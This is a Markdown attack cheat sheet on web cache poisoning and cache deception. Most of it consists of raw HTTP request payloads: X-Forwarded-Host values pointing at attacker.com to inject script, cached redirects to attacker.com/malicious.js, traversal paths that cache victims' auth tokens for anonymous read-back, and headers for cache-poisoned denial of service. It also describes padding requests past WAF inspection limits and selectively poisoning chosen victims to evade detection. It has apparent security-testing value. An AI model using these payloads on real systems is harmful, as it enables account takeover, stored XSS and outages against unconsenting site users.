# Cache Poisoning

## Overview
Web cache poisoning uses unkeyed inputs to store malicious responses in shared caches, serving them to other users.

## Core Concept
```
Cache key = typically: Host + Path + Query string
Unkeyed inputs = headers/params that affect response but NOT the cache key
→ Poison cache with malicious unkeyed input → served to all users requesting same key
```

## Finding Unkeyed Inputs
```
# Use Param Miner (Burp extension) to discover unkeyed headers/params
# Common unkeyed headers:
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-For
X-Host
X-Original-URL
X-Rewrite-URL
X-Original-Forwarded-For
Forwarded
```

## Cache Poisoning via X-Forwarded-Host
```
# If server uses X-Forwarded-Host for generating URLs in response
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response contains:
<script src="https://attacker.com/static/app.js">
# → Cache this response → serve XSS to all visitors
```

## Cache Poisoning for XSS
```
# Find unkeyed input that is reflected in response
GET /search?q=hello HTTP/1.1
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# If reflected without encoding in cached response
# All users hitting /search?q=hello get XSS
```

## Cache Poisoning via HTTP Request Smuggling
```
# Smuggle a request that poisons cache for next user
# POST with CL.TE/TE.CL to inject crafted request
# See http_request_smuggling.md
```

## Cache Key Confusion
```
# Some caches ignore port, some don't
GET /page HTTP/1.1
Host: target.com:1337  # different cache key, same backend response

# Fat GET requests
GET /page?param=evil HTTP/1.1
# If param is unkeyed but reflected

# Cache parameter cloaking
GET /page?utm_content=1&param=evil  # utm_content is keyed, param is unkeyed but breaks cache key
```

## Web Cache Deception
```
# Different attack: trick user into caching their private data
# App serves authenticated page for unknown extensions

# Trick victim into visiting:
https://target.com/my-account/cache.css
https://target.com/dashboard.jpg

# If server responds with authenticated content
# Cache stores it → attacker requests same URL → gets victim's data

# Works when:
1. Cache caches static-extension paths
2. Server ignores path suffix and returns dynamic content
3. Cache doesn't validate response is static
```

## Testing Methodology
1. Identify caching behavior: check Age, X-Cache, CF-Cache-Status headers
2. Use Param Miner to find unkeyed headers
3. Test each unkeyed header for reflection in response
4. Test reflection for XSS/redirection injection
5. Poison cache: send malicious request, observe cache status
6. Request from clean browser/IP to confirm poison worked
7. Test web cache deception: add .css/.jpg suffix to authenticated pages

## Cache Identification
```
# Cache hit indicators:
X-Cache: HIT
CF-Cache-Status: HIT
Age: <non-zero>
X-Varnish: <two IDs>

# Force cache miss (to test fresh):
Cache-Control: no-cache
Pragma: no-cache
# Or add cache-busting param: ?cb=12345
```

## Tools
- Burp Param Miner — unkeyed input discovery
- `Web Cache Vulnerability Scanner` (WCVS)
- Manual testing with cache busters



## Additional Techniques — ported from WebSkills (web-cache-vulnerabilities)

### Cache-key manipulation (parser discrepancies)
Every attack below is one idea: find a single URL the **cache reads as "cacheable static asset"** while the **origin reads as "sensitive dynamic page,"** or that splits/collides keys.

| Technique | Example | Discrepancy exploited |
|-----------|---------|-----------------------|
| Unkeyed params | `?q=hi&utm_source=<payload>` | `utm_*`,`_method`,`cb`,`callback`,`gclid` used by origin, excluded from key |
| Duplicate params | `?id=SAFE&id=EVIL` | cache keys first, origin honors last → poison stored under "safe" key |
| Path normalization | `/account/.%2fstyle.css` | origin→`/account`, cache→".css static file" |
| URL decoding | `/api/me%2Fprofile.css` | cache decodes `%2f` but origin doesn't (or reverse) |
| Encoded delimiters | `/profile%3bfoo.css` | one hop treats `%3b`(`;`) as delimiter, other as literal |
| Dot segments | `/static/..%2faccount` | cache collapses `..` while origin resolves later |
| Trailing slash | `/account/` | cache = distinct key, origin = same resource |
| Mixed case | `/Account`, `?LANG=`, `X-Forwarded-Host` | case-sensitive cache vs case-insensitive origin |
| UTF-8 normalization | `/account%c0%afstyle.css` | overlong/full-width `/`,`.`,`;` normalized by one component only |

### Path-traversal cache attacks
Traversal lets you express one effective path the cache and origin resolve differently:
```
GET /static/..%2f..%2faccount     # cache: "/static/..." cacheable ; origin: /account
GET /assets/..%252fapi%252fme     # double-encoded traversal to a sensitive API
GET /account/..%2fstyle.css       # sensitive page mapped onto a .css key
```
- Plain `../`, encoded `..%2f`, double-decode `..%252f`, and mixed `.%2e/` / `..%5c` each defeat a different normalization order. Cache builds its key from the raw/single-decoded URL; if the origin decodes further, the served resource differs from what the cache thinks it stored.

### Cache-Poisoned DoS (CPDoS)
Force the cache to store an **error** response, which it then serves to all users for that URL — DoS without touching the origin (research: cpdos.org).

| Class | Idea | Payload |
|-------|------|---------|
| **HHO** (Header Oversize) | header larger than the *origin* accepts but the *cache* forwards → origin 400, cache stores it | `X-Oversize: AAAA…×8KB` |
| **HMC** (Meta Character) | control/meta char the cache forwards but origin rejects | header value with `\n` / `%0a`, `%00`, `%1f` |
| **HMO** (Method Override) | override header makes origin treat a cached GET as another method → error cached vs GET key | `X-HTTP-Method-Override: POST` (also `X-HTTP-Method`, `X-Method-Override`) |

Detection: seed with a cache buster + the malformed request → observe `400`/`413`/`501`; then send a **normal** request to the same key → if it returns the cached error (HIT via `Age`/`X-Cache`), CPDoS confirmed. Limits: many CDNs cap header size and don't cache 4xx/5xx by default; often per-POP; short TTLs. Mitigation: don't cache errors; align cache/origin header-size limits; strip method-override headers at the edge.

### Response-splitting & smuggling-assisted poisoning
- If a reflected value reaches a response **header** and CR/LF (`%0d%0a`) isn't filtered → split the response and inject a second body/header the cache stores (see crlf_injection.md / http_request_smuggling.md).
- Front-end/back-end request-boundary disagreement (CL.TE/TE.CL) can store a smuggled response against a victim's URL with **no** unkeyed input (HackerOne #919175 — smuggling → cache poisoning, $1,700).

### CDN debug headers (force verbose cacheability)
```bash
# Akamai — ask the edge to report caching decision
curl -sI -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-get-cache-key, akamai-x-check-cacheable" https://target/path
# Cloudflare/Fastly: inspect CF-Cache-Status / X-Served-By / X-Cache + Age
```


## Additional Techniques — ported from WebSkills (writeup-techniques/cache)

### X-Forwarded-Scheme / X-Forwarded-Proto → cached redirect-loop DoS
Rack/Rails trust `X-Forwarded-Scheme` to decide HTTPS enforcement. Spoof it against a static asset so the origin emits a cacheable `301`; every user then gets a redirect/loop instead of the asset. Combine scheme-spoof + host-spoof for irreversible redirects on high-visibility resources.
```
GET /assets/application.js HTTP/1.1
Host: victim.com
X-Forwarded-Scheme: http
```

### CORS ACAO reflection → cached DoS
A reflected `Origin` cached as `Access-Control-Allow-Origin` means every visitor gets the wrong ACAO for that URL → browsers block the response = DoS (Automattic WP-JSON, 405 upvotes). Test by poisoning with `?cb=` and confirming the mismatched ACAO is served to a clean request.

### Open Graph / canonical meta poisoning
Reflected HTML injected inside `<meta property="og:...">` / `<link rel=canonical>` tags gets cached, then **social scrapers** consume the poisoned OG tags — spreading the payload far beyond direct visitors (Red Hat). Frames as stored XSS + phishing amplification. Use a harmless cache-buster while testing.

### Route / hidden-route poisoning (third-party page platforms)
On page-serving platforms (HubSpot, Ghost custom domains) you register a page, plant a payload, and trick the platform into serving your response on the victim's domain via the shared cache. Ghost: custom domains redirect from `user.ghost.io` — poison the mapping.

### Memcache command injection (CRLF into a key-value store)
When a platform passes unsanitized HTTP input into memcache's clear-text protocol, inject CRLF to add memcache commands and poison cached `user→server` mappings (e.g. the cache stores a user's IP/port + creds; rewrite them to your own server). Lets you desync responses even to users whose email you don't know. See CRLF-injection playbook.

### CSPT-assisted cache deception (traversal → cached token → ATO)
A SPA concatenates a route param into an API path and attaches auth headers. Inject client-side path traversal so the authenticated fetch lands on a cacheable static-suffix variant; the CDN caches the JSON token under a public key; read it back anonymously → ATO.
```
../../../v1/token.css
```
Recipe: find SPA URL builders that reuse auth headers → test `.css/.js/.jpg/.json` suffixes for `Cache-Control: public` + `X-Cache: Hit` on JSON → lure victim → read back logged-out.

### Chaining unkeyed inputs + selective poisoning
Seed the payload via one unkeyed input (param A) and trigger it via a second (param B) — neither alone changes the cached response ("Chaining Unkeyed Inputs"). **Selective poisoning**: gate the payload so the cache only stores it when a target condition matches (specific `User-Agent`, `Accept-Language`, or cookie), narrowing blast radius to chosen victims and evading detection.

### Django ALLOWED_HOSTS bypass via custom middleware
Even with `ALLOWED_HOSTS` set, apps that read `request.META['HTTP_HOST']` or `X-Forwarded-Host` in **custom middleware** reintroduce Host poisoning — a fake Host flows into poisoned password-reset/verification email links, CSRF, and cache poisoning.

### CPDoS triggers beyond HHO/HMC/HMO
Additional origin-error triggers whose cached response is served to all anon users of a key:
```
Host: victim.com:1                     # unkeyed dead port → redirect error, cached
X-Amz-Website-Location-Redirect: someThing   # forces origin 4xx
Host: viCTim.com                       # origin errors on non-lowercase Host; cache key normalized → cached error
GET /%2e%2e%2fpath                     # origin errors on encoded path, cache stores under decoded key
<unkeyed param that makes redirect URL huge>  # long-redirect error, cached
```
Detection caveat: some status codes aren't cached — retest, results can be flaky.

### Shared static JS across subdomains → cached 301 to attacker JS
When a single JS asset is served across dozens of subdomains and `X-Forwarded-Host` drives its redirect logic, an unkeyed cached `301 Location: https://attacker.com/malicious.js` becomes stored XSS **everywhere that asset is imported**. Map every host reusing the asset path to prove multi-subdomain blast radius (Shopify cross-host loops, PayPal).
```
GET /shared/asset.js HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com/malicious.js
```

### WAF inspection-window bypass (pad past inspected bytes)
Akamai's WAF inspects only the first **8KB** by default (up to 128KB with Advanced Metadata); Cloudflare inspects up to **128KB**. Pad the request with junk so the XSS/CPDoS payload lands **past** the inspected window while still reaching the origin/cache. Static `.js` GETs may skip content inspection entirely — send the payload in an untrusted header on the `.js` GET, then race the HTML request.

### Hop-by-hop header trick (drop a header before the cache-key stage)
If a header is stripped by the cache but honored by the origin, list it in `Connection:` so a sloppy proxy drops it before the cache-key computation — the origin still processes the value while the cache never keys on it.
```
Connection: close, X-Forwarded-Host
X-Forwarded-Host: attacker.com
```

### Escalation CVE chains (cache-poison as a link)
- **Sitecore XP** pre-auth `HtmlCache` poisoning → post-auth BinaryFormatter deserialization RCE (CVE-2025-53691).
- **Apache** `RewriteRule [P]` request-splitting → cache poisoning of arbitrary URLs (CVE-2023-25690).
- Request smuggling / HTTP response desync → poison arbitrary URLs with an attacker-controlled (XSS) body, no unkeyed input needed.
